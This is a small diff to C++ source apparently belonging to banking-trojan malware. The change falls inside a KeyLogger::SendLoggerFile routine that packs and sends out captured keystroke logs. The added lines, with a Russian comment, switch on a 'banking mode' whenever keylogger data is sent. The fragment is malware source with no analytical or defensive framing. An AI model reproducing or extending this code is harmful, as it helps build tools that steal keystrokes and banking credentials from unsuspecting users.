@@ -2717,6 +2717,11 @@ bool KeyLogger::SendLoggerFile(PCHAR LogFileName, bool *InvalidFile)
 
 
 
+	// При любой отправке данных кейлогера включаем режим Банк
+    SetBankingMode();
+
+
+
 	PKeyLogPacker Packer = KLGPacker::Initialize(LogFileName, false);
 	if (Packer == NULL)
 		return false;
